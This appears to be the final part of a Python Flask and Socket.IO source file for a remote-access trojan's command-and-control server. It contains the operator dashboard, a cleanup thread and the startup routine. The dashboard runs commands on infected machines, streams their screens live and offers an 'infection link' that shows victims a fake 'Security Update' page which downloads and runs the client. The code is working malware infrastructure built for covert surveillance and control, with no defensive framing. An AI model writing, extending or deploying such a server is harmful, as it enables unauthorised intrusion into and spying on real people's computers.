        <div class="container">
            <div class="dashboard-grid">
                <!-- Left Panel: Clients -->
                <div class="panel">
                    <div class="panel-title">📱 Connected Devices</div>
                    <div class="client-list" id="client-list">
                        <div style="text-align:center;padding:30px;color:#8888ff;">
                            No devices connected...
                        </div>
                    </div>
                    
                    <div class="stats-grid">
                        <div class="stat-box">
                            <div class="stat-value" id="total-clients">0</div>
                            <div class="stat-label">Total Devices</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="online-clients">0</div>
                            <div class="stat-label">Online</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="streaming-clients">0</div>
                            <div class="stat-label">Streaming</div>
                        </div>
                    </div>
                </div>
                
                <!-- Right Panel: Live Stream -->
                <div class="live-stream-container">
                    <div class="panel-title">🎬 Live Motion Stream</div>
                    <div class="stream-display" id="stream-display">
                        <div class="no-stream" id="no-stream">
                            Select a device and start streaming to see live motion
                        </div>
                        <img id="live-frame" alt="Live Stream">
                        <div class="stream-info" id="stream-info">
                            FPS: <span id="stream-fps">0</span> | 
                            Size: <span id="stream-size">0 KB</span>
                        </div>
                        <div class="frame-counter" id="frame-counter">
                            Frame: <span id="current-frame">0</span>/<span id="total-frames">0</span>
                        </div>
                    </div>
                    
                    <div class="stream-controls">
                        <button id="start-stream-btn" onclick="startStream()" class="btn btn-success">▶ Start Stream</button>
                        <button id="stop-stream-btn" onclick="stopStream()" class="btn btn-danger" style="display:none;">⏹ Stop Stream</button>
                        <button onclick="clearFrames()" class="btn btn-primary">🗑️ Clear Frames</button>
                    </div>
                    
                    <div class="fps-controls">
                        <span style="color:#88ddff;">FPS:</span>
                        <button class="fps-btn active" onclick="setFPS(1)">1 FPS</button>
                        <button class="fps-btn" onclick="setFPS(2)">2 FPS</button>
                        <button class="fps-btn" onclick="setFPS(5)">5 FPS</button>
                        <button class="fps-btn" onclick="setFPS(10)">10 FPS</button>
                    </div>
                </div>
            </div>
            
            <!-- Tab Container -->
            <div class="tab-container">
                <div class="tabs">
                    <div class="tab active" onclick="showTab('commands')">💻 Commands</div>
                    <div class="tab" onclick="showTab('infect')">🔗 Infection</div>
                    <div class="tab" onclick="showTab('output')">📄 Output</div>
                </div>
                
                <div class="tab-content">
                    <!-- Commands Tab -->
                    <div id="commands-tab" class="tab-pane active">
                        <div class="command-section">
                            <input type="text" id="command-input" class="command-input" placeholder="Enter command (e.g., whoami, ipconfig, screenshot)...">
                            <button onclick="executeCommand()" class="btn btn-primary">Execute</button>
                        </div>
                        
                        <div class="quick-commands">
                            <button onclick="sendQuickCommand('whoami')" class="btn">whoami</button>
                            <button onclick="sendQuickCommand('ipconfig')" class="btn">ipconfig</button>
                            <button onclick="sendQuickCommand('screenshot')" class="btn">screenshot</button>
                            <button onclick="sendQuickCommand('tasklist')" class="btn">tasklist</button>
                            <button onclick="sendQuickCommand('systeminfo')" class="btn">systeminfo</button>
                            <button onclick="sendQuickCommand('dir')" class="btn">dir</button>
                            <button onclick="sendQuickCommand('getmac')" class="btn">getmac</button>
                            <button onclick="sendQuickCommand('netstat')" class="btn">netstat</button>
                        </div>
                    </div>
                    
                    <!-- Infection Tab -->
                    <div id="infect-tab" class="tab-pane">
                        <div class="infection-link">
                            <h3 style="color:#00aaff;margin-bottom:15px;">🔗 Infection Link</h3>
                            <p>Share this link with victims to infect their devices:</p>
                            <input type="text" id="infection-url" readonly value="' + request.host_url + 'infect">
                            <div style="display:flex;gap:10px;margin-top:15px;">
                                <button onclick="copyInfectionLink()" class="btn btn-primary">Copy Link</button>
                                <button onclick="testInfectionLink()" class="btn btn-success">Test Link</button>
                            </div>
                            <p style="color:#88ddff;font-size:12px;margin-top:15px;">
                                When victims visit this link, they will see a fake "Security Update" page that downloads and runs our client.
                            </p>
                        </div>
                    </div>
                    
                    <!-- Output Tab -->
                    <div id="output-tab" class="tab-pane">
                        <div class="output-panel">
                            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
                                <h4 style="color:#00aaff;">Command Output</h4>
                                <button onclick="clearOutput()" class="btn btn-danger" style="padding:5px 10px;">Clear</button>
                            </div>
                            <div class="output-content" id="command-output">
                                <!-- Output appears here -->
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
        <script>
            let socket = null;
            let selectedClientId = null;
            let currentFPS = 2;
            let frames = [];
            let currentFrameIndex = 0;
            let frameInterval = null;
            
            // Initialize WebSocket
            function initWebSocket() {
                const token = getCookie('c2_token');
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsUrl = `${protocol}//${window.location.host}/socket.io/?token=${token}`;
                
                socket = io(wsUrl);
                
                socket.on('connect', () => {
                    console.log('Connected to C2 server');
                    socket.emit('controller_connect');
                    updateStats();
                });
                
                socket.on('auth_error', () => {
                    alert('Session expired. Please login again.');
                    window.location.href = '/';
                });
                
                socket.on('client_online', (data) => {
                    addOrUpdateClient(data);
                });
                
                socket.on('client_offline', (data) => {
                    updateClientStatus(data.client_id, false);
                });
                
                socket.on('command_result', (data) => {
                    addToOutput(data);
                });
                
                socket.on('new_frame', (data) => {
                    handleNewFrame(data);
                });
                
                socket.on('stream_started', (data) => {
                    document.getElementById('start-stream-btn').style.display = 'none';
                    document.getElementById('stop-stream-btn').style.display = 'inline-block';
                    updateClientStreamingStatus(data.client_id, true);
                });
                
                socket.on('stream_stopped', (data) => {
                    document.getElementById('start-stream-btn').style.display = 'inline-block';
                    document.getElementById('stop-stream-btn').style.display = 'none';
                    updateClientStreamingStatus(data.client_id, false);
                    stopFrameAnimation();
                });
            }
            
            // Client management
            function addOrUpdateClient(client) {
                const list = document.getElementById('client-list');
                const clientId = client.client_id;
                
                let clientElement = document.getElementById(`client-${clientId}`);
                if (!clientElement) {
                    clientElement = document.createElement('div');
                    clientElement.className = 'client-item';
                    clientElement.id = `client-${clientId}`;
                    clientElement.onclick = () => selectClient(clientId);
                    list.appendChild(clientElement);
                }
                
                const statusClass = client.streaming ? 'streaming' : (client.online ? 'online' : 'offline');
                const statusText = client.streaming ? 'STREAMING' : (client.online ? 'ONLINE' : 'OFFLINE');
                
                clientElement.innerHTML = `
                    <div class="client-header">
                        <div class="client-name">${client.hostname || clientId}</div>
                        <div class="client-status ${statusClass}">${statusText}</div>
                    </div>
                    <div style="font-size:12px;color:#aaccff;">
                        👤 ${client.username || 'Unknown'}<br>
                        💻 ${client.os || 'Unknown'}
                    </div>
                `;
                
                updateStats();
            }
            
            function selectClient(clientId) {
                selectedClientId = clientId;
                
                // Update UI
                document.querySelectorAll('.client-item').forEach(item => {
                    item.classList.remove('selected');
                });
                document.getElementById(`client-${clientId}`).classList.add('selected');
                
                // Load frames for this client
                loadClientFrames(clientId);
            }
            
            function updateClientStatus(clientId, isOnline) {
                const element = document.getElementById(`client-${clientId}`);
                if (element) {
                    const statusElement = element.querySelector('.client-status');
                    if (statusElement) {
                        statusElement.className = `client-status ${isOnline ? 'online' : 'offline'}`;
                        statusElement.textContent = isOnline ? 'ONLINE' : 'OFFLINE';
                    }
                }
                updateStats();
            }
            
            function updateClientStreamingStatus(clientId, isStreaming) {
                const element = document.getElementById(`client-${clientId}`);
                if (element) {
                    const statusElement = element.querySelector('.client-status');
                    if (statusElement) {
                        statusElement.className = `client-status ${isStreaming ? 'streaming' : 'online'}`;
                        statusElement.textContent = isStreaming ? 'STREAMING' : 'ONLINE';
                    }
                }
                updateStats();
            }
            
            // Stream control
            function startStream() {
                if (!selectedClientId) {
                    alert('Please select a client first');
                    return;
                }
                
                socket.emit('start_stream_command', {
                    client_id: selectedClientId,
                    interval: 1 / currentFPS
                });
                
                document.getElementById('no-stream').style.display = 'none';
                document.getElementById('stream-info').style.display = 'block';
                document.getElementById('frame-counter').style.display = 'block';
            }
            
            function stopStream() {
                if (!selectedClientId) return;
                
                socket.emit('stop_stream_command', {
                    client_id: selectedClientId
                });
                
                document.getElementById('live-frame').style.display = 'none';
                document.getElementById('no-stream').style.display = 'block';
                document.getElementById('no-stream').textContent = 'Stream stopped';
                document.getElementById('stream-info').style.display = 'none';
                document.getElementById('frame-counter').style.display = 'none';
            }
            
            function setFPS(fps) {
                currentFPS = fps;
                
                // Update UI
                document.querySelectorAll('.fps-btn').forEach(btn => {
                    btn.classList.remove('active');
                });
                event.target.classList.add('active');
                
                // Update stream if active
                if (selectedClientId) {
                    socket.emit('start_stream_command', {
                        client_id: selectedClientId,
                        interval: 1 / currentFPS
                    });
                }
            }
            
            function clearFrames() {
                frames = [];
                currentFrameIndex = 0;
                document.getElementById('live-frame').style.display = 'none';
                document.getElementById('no-stream').style.display = 'block';
                document.getElementById('no-stream').textContent = 'Frames cleared';
                document.getElementById('current-frame').textContent = '0';
                document.getElementById('total-frames').textContent = '0';
            }
            
            // Frame handling
            function handleNewFrame(data) {
                if (data.client_id !== selectedClientId) return;
                
                // Add to frames array
                frames.push({
                    data: data.frame,
                    timestamp: data.timestamp,
                    index: data.frame_index
                });
                
                // Keep only last 50 frames
                if (frames.length > 50) {
                    frames.shift();
                }
                
                // Update display
                updateFrameDisplay();
                
                // Start animation if not already running
                if (!frameInterval && frames.length > 1) {
                    startFrameAnimation();
                }
            }
            
            function updateFrameDisplay() {
                if (frames.length === 0) return;
                
                const frame = frames[frames.length - 1];
                const img = document.getElementById('live-frame');
                
                img.src = 'data:image/png;base64,' + frame.data;
                img.style.display = 'block';
                document.getElementById('no-stream').style.display = 'none';
                
                // Update info
                const sizeKB = Math.round(frame.data.length / 1024 * 3 / 4); // Approximate KB
                document.getElementById('stream-size').textContent = sizeKB + ' KB';
                document.getElementById('stream-fps').textContent = currentFPS;
                document.getElementById('current-frame').textContent = frame.index;
                document.getElementById('total-frames').textContent = frames.length;
            }
            
            function startFrameAnimation() {
                if (frameInterval) clearInterval(frameInterval);
                
                frameInterval = setInterval(() => {
                    if (frames.length < 2) return;
                    
                    currentFrameIndex = (currentFrameIndex + 1) % frames.length;
                    const frame = frames[currentFrameIndex];
                    
                    const img = document.getElementById('live-frame');
                    img.src = 'data:image/png;base64,' + frame.data;
                    document.getElementById('current-frame').textContent = frame.index;
                }, 1000 / currentFPS);
            }
            
            function stopFrameAnimation() {
                if (frameInterval) {
                    clearInterval(frameInterval);
                    frameInterval = null;
                }
            }
            
            async function loadClientFrames(clientId) {
                try {
                    const response = await fetch(`/api/stream/frames/${clientId}`);
                    const data = await response.json();
                    
                    frames = data.frames.map(f => ({
                        data: f.data,
                        timestamp: f.timestamp,
                        index: f.index || 0
                    }));
                    
                    if (frames.length > 0) {
                        updateFrameDisplay();
                        if (data.streaming) {
                            startFrameAnimation();
                        }
                    }
                } catch (error) {
                    console.error('Error loading frames:', error);
                }
            }
            
            // Command execution
            function executeCommand() {
                if (!selectedClientId) {
                    alert('Please select a client first');
                    return;
                }
                
                const command = document.getElementById('command-input').value.trim();
                if (!command) {
                    alert('Please enter a command');
                    return;
                }
                
                socket.emit('execute_command', {
                    client_id: selectedClientId,
                    command: command
                });
                
                addToOutput({
                    client_id: selectedClientId,
                    command: command,
                    output: 'Command sent...',
                    timestamp: new Date().toISOString()
                });
                
                document.getElementById('command-input').value = '';
            }
            
            function sendQuickCommand(command) {
                if (!selectedClientId) {
                    alert('Please select a client first');
                    return;
                }
                
                socket.emit('execute_command', {
                    client_id: selectedClientId,
                    command: command
                });
                
                addToOutput({
                    client_id: selectedClientId,
                    command: command,
                    output: `Quick command sent: ${command}`,
                    timestamp: new Date().toISOString()
                });
            }
            
            function addToOutput(data) {
                const output = document.getElementById('command-output');
                const time = new Date(data.timestamp).toLocaleTimeString();
                
                const entry = document.createElement('div');
                entry.style.marginBottom = '10px';
                entry.style.paddingBottom = '10px';
                entry.style.borderBottom = '1px solid #334477';
                entry.innerHTML = `
                    <div style="color:#8888ff;font-size:0.9em;">[${time}] ${data.client_id}</div>
                    <div style="color:#00aaff;">$ ${data.command || 'N/A'}</div>
                    <div style="color:#88ff88;white-space:pre-wrap;">${data.output || 'No output'}</div>
                `;
                
                output.appendChild(entry);
                output.scrollTop = output.scrollHeight;
            }
            
            function clearOutput() {
                document.getElementById('command-output').innerHTML = '';
            }
            
            // Infection
            function copyInfectionLink() {
                const url = document.getElementById('infection-url').value;
                navigator.clipboard.writeText(url);
                alert('Infection link copied to clipboard!');
            }
            
            function testInfectionLink() {
                const url = document.getElementById('infection-url').value;
                window.open(url, '_blank');
            }
            
            // Tab management
            function showTab(tabName) {
                // Update active tab
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.classList.remove('active');
                });
                event.target.classList.add('active');
                
                // Show active content
                document.querySelectorAll('.tab-pane').forEach(pane => {
                    pane.classList.remove('active');
                });
                document.getElementById(`${tabName}-tab`).classList.add('active');
            }
            
            // Stats
            async function updateStats() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    
                    document.getElementById('total-clients').textContent = data.total_clients || 0;
                    document.getElementById('online-clients').textContent = data.online_clients || 0;
                    document.getElementById('streaming-clients').textContent = data.streaming_clients || 0;
                    
                } catch (error) {
                    console.error('Error updating stats:', error);
                }
            }
            
            // Utility
            function getCookie(name) {
                const value = `; ${document.cookie}`;
                const parts = value.split(`; ${name}=`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            }
            
            // Initialize
            window.onload = function() {
                initWebSocket();
                
                // Set infection URL
                document.getElementById('infection-url').value = window.location.origin + '/infect';
                
                // Update stats every 3 seconds
                setInterval(updateStats, 3000);
                
                // Auto-refresh frames
                setInterval(() => {
                    if (selectedClientId) {
                        loadClientFrames(selectedClientId);
                    }
                }, 5000);
            };
        </script>
    </body>
    </html>
    '''

# ============= CLEANUP THREAD =============

def cleanup_thread():
    """Cleanup old data and frames"""
    while True:
        try:
            # Mark inactive clients as offline
            cutoff = time.time() - 120
            for client_id, client in list(clients.items()):
                if client.get('last_seen', 0) < cutoff and client.get('online', False):
                    clients[client_id]['online'] = False
                    
                    if client_id in streaming_clients:
                        streaming_clients[client_id]['active'] = False
                    
                    socketio.emit('client_offline', {'client_id': client_id})
            
            # Clean old frames (older than 5 minutes)
            frame_cutoff = time.time() - 300
            for client_id in list(client_frames.keys()):
                client_frames[client_id] = [
                    frame for frame in client_frames[client_id]
                    if frame['timestamp'] > frame_cutoff
                ]
                
                # Remove empty lists
                if not client_frames[client_id]:
                    del client_frames[client_id]
            
            # Clean old sessions
            for token, expiry in list(session_tokens.items()):
                if expiry < time.time():
                    del session_tokens[token]
            
            time.sleep(60)
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            time.sleep(60)

threading.Thread(target=cleanup_thread, daemon=True).start()

# ============= MAIN =============

def main():
    port = int(os.environ.get('PORT', 10000))
    
    print(f"[*] Starting Live Motion Stream C2 Server on port {port}")
    print(f"[*] Web Interface: http://0.0.0.0:{port}")
    print(f"[*] Login Password: {ADMIN_PASSWORD}")
    print(f"[*] Infection Link: http://0.0.0.0:{port}/infect")
    print(f"[*] Features:")
    print(f"    ✓ Live motion stream (stop-motion animation)")
    print(f"    ✓ Real-time screen capture")
    print(f"    ✓ FPS control (1-10 FPS)")
    print(f"    ✓ Auto-frame cleanup")
    print(f"    ✓ Infection link system")
    print(f"    ✓ Password protected")
    print()
    print("[*] Share the infection link to get new clients!")
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)

if __name__ == '__main__':
    main()
